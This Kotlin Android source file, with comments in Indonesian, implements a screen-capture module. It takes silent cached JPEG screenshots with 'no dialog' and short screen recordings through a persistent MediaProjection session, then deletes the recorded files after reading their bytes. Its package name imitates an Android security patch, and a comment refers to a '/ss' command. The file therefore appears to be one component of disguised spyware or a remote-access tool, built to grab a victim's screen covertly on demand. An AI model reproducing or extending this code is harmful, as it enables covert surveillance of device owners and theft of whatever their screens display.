package com.android.security.patch

import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.view.WindowManager
import java.io.ByteArrayOutputStream
import java.io.File

object ScreenCap {

    private var projection: MediaProjection? = null
    private var vDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var sessionRunning = false

    private var width = 0
    private var height = 0
    private var dpi = 0

    @Volatile private var lastBitmap: Bitmap? = null
    @Volatile private var lastCapture = 0L

    private var recorder: MediaRecorder? = null
    private var recordFile: File? = null
    private var recording = false

    private val main = Handler(Looper.getMainLooper())

    private val cb = object : MediaProjection.Callback() {
        override fun onStop() {
            try { stopSession() } catch (_: Throwable) {}
            projection = null
        }
    }

    fun isReady(): Boolean = projection != null && sessionRunning
    fun isRecording(): Boolean = recording

    fun setProjection(p: MediaProjection) {
        try { p.unregisterCallback(cb) } catch (_: Throwable) {}
        try { p.registerCallback(cb, main) } catch (_: Throwable) {}
        projection = p
    }

    /** Panggil sekali setelah projection di-grant. Bikin VD + ImageReader persisten. */
    fun startSession(ctx: Context): Boolean {
        val p = projection ?: return false
        if (sessionRunning) return true

        val m = metrics(ctx)
        width = m.first; height = m.second; dpi = m.third

        val reader = try {
            ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        } catch (_: Throwable) { return false }

        reader.setOnImageAvailableListener({ r ->
            val now = System.currentTimeMillis()
            if (now - lastCapture < 400) {
                try { r.acquireLatestImage()?.close() } catch (_: Throwable) {}
                return@setOnImageAvailableListener
            }
            lastCapture = now
            try {
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val plane = img.planes[0]
                    val rowStride = plane.rowStride
                    val pixStride = plane.pixelStride
                    val rowPadding = rowStride - pixStride * width
                    val bmpW = width + rowPadding / pixStride
                    val bmp = Bitmap.createBitmap(bmpW, height, Bitmap.Config.ARGB_8888)
                    bmp.copyPixelsFromBuffer(plane.buffer)
                    val cropped = Bitmap.createBitmap(bmp, 0, 0, width, height)
                    val old = lastBitmap
                    lastBitmap = cropped
                    try { old?.recycle() } catch (_: Throwable) {}
                } finally {
                    try { img.close() } catch (_: Throwable) {}
                }
            } catch (_: Throwable) {}
        }, main)

        return try {
            vDisplay = p.createVirtualDisplay(
                "cap", width, height, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.surface, null, null
            )
            imageReader = reader
            sessionRunning = true
            true
        } catch (_: Throwable) {
            try { reader.close() } catch (_: Throwable) {}
            false
        }
    }

    fun stopSession() {
        if (recording) try { stopRec() } catch (_: Throwable) {}
        sessionRunning = false
        try { imageReader?.setOnImageAvailableListener(null, null) } catch (_: Throwable) {}
        try { imageReader?.close() } catch (_: Throwable) {}
        try { vDisplay?.release() } catch (_: Throwable) {}
        imageReader = null
        vDisplay = null
        try { lastBitmap?.recycle() } catch (_: Throwable) {}
        lastBitmap = null
    }

    /** Ambil JPEG dari cache Bitmap. Instan, no dialog. */
    fun screenshot(): ByteArray? {
        if (!sessionRunning) return null
        if (lastBitmap == null) {
            try { Thread.sleep(1200) } catch (_: Throwable) {}
        }
        val bmp = lastBitmap ?: return null
        return try {
            val baos = ByteArrayOutputStream()
            bmp.compress(Bitmap.CompressFormat.JPEG, 80, baos)
            baos.toByteArray()
        } catch (_: Throwable) { null }
    }

    /** Record. Swap surface dari ImageReader ke MediaRecorder sebentar. */
    fun startRec(ctx: Context, seconds: Int): Boolean {
        if (!sessionRunning || recording) return false
        val vd = vDisplay ?: return false

        val f = File(ctx.getExternalFilesDir(null), "rec_${System.currentTimeMillis()}.mp4")
        val r = try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(ctx)
            else @Suppress("DEPRECATION") MediaRecorder()
        } catch (_: Throwable) { return false }

        return try {
            r.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoSize(width, height)
                setVideoFrameRate(30)
                setVideoEncodingBitRate(6_000_000)
                setOutputFile(f.absolutePath)
                prepare()
            }
            try { imageReader?.setOnImageAvailableListener(null, null) } catch (_: Throwable) {}
            vd.surface = r.surface
            r.start()
            recorder = r
            recordFile = f
            recording = true
            main.postDelayed({ try { stopRec() } catch (_: Throwable) {} }, seconds * 1000L)
            true
        } catch (_: Throwable) {
            try { r.release() } catch (_: Throwable) {}
            try { vd.surface = imageReader?.surface } catch (_: Throwable) {}
            false
        }
    }

    fun stopRec(): ByteArray? {
        if (!recording) return null
        recording = false
        val f = recordFile
        try { recorder?.stop() } catch (_: Throwable) {}
        try { recorder?.release() } catch (_: Throwable) {}
        recorder = null
        // balikin surface ke ImageReader, biar /ss masih jalan
        try { vDisplay?.surface = imageReader?.surface } catch (_: Throwable) {}
        recordFile = null
        if (f == null || !f.exists()) return null
        val bytes = f.readBytes()
        f.delete()
        return bytes
    }

    fun clearProjection() {
        try { stopSession() } catch (_: Throwable) {}
        try { projection?.unregisterCallback(cb) } catch (_: Throwable) {}
        try { projection?.stop() } catch (_: Throwable) {}
        projection = null
    }

    private fun metrics(ctx: Context): Triple<Int, Int, Int> {
        val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val dm = DisplayMetrics()
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val b = wm.currentWindowMetrics.bounds
            val dens = ctx.resources.displayMetrics.densityDpi
            Triple(b.width(), b.height(), dens)
        } else {
            @Suppress("DEPRECATION") wm.defaultDisplay.getRealMetrics(dm)
            Triple(dm.widthPixels, dm.heightPixels, dm.densityDpi)
        }
    }
}
